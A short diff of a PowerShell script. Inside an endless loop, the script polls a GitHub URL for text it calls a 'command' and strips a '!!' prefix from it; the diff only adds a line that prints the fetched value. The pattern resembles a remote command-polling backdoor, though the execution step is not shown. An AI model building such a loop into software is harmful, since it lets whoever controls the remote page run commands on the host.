@@ -6,7 +6,7 @@ while ($true) {
     try {
         # Fetch the raw content of the GitHub page (plain text)
         $command = Invoke-RestMethod -Uri $githubUrl -Headers @{"Cache-Control"="no-cache"}
-
+        Write-Host $command
         # Check if the command starts with '!!' and strip that part off
         if ($command -like "!!*") {
             $command = $command.Substring(2)
